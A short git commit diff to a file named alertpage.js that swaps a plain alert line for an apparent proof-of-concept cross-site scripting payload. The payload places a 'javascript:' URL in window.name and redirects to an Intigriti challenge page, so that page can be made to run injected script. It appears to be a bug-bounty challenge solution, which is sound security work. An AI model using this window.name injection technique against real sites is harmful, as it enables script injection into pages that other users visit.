714f3abfeef05710487308e7beb01a0ac4595bbb
kindofn0pe <30385480+kindofn0pe@users.noreply.github.com>
2020-11-04 22:45:39 +0200

    Update alertpage.js

--- alertpage.js
+++ alertpage.js
@@ -1,1 +1,5 @@
-container.onclick = alert('Hello World');
+<script>
+    const payload = 'alert(origin)';
+    window.name = `javascript:${payload}`;
+    location = 'https://challenge-1120.intigriti.io/';
+</script>
